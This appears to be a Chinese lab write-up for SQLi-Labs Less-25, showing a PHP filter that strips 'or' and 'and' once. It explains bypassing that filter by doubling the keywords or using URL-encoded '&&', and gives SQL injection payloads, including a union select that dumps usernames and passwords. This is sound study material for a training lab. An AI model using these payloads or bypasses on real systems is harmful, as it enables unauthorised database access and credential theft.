# Less-25 （and，or）

## 查看分析源码
```php
$id= preg_replace('/or/i',"", $id);   // 过滤 or（大小写不敏感）
$id= preg_replace('/AND/i',"", $id);  // 过滤 and（大小写不敏感）
```
由于只替换了一次可以尝试双写绕过

?id=1%27%20anandd%201=1;%00
![](99_Attachments/图片/Less-25/file-20260602163538995.png)
还有一种方法是

and -> &&

or -> ||

由于apache解析的问题&&要换成经url编码后的%26%26
?id=1' %26%26 1=1 --+

最终payload：

//因为password包含or
?id=-1' union select 1,group_concat(username),group_concat(passwoorrd) from users --+
![](99_Attachments/图片/Less-25/file-20260602164049337.png)
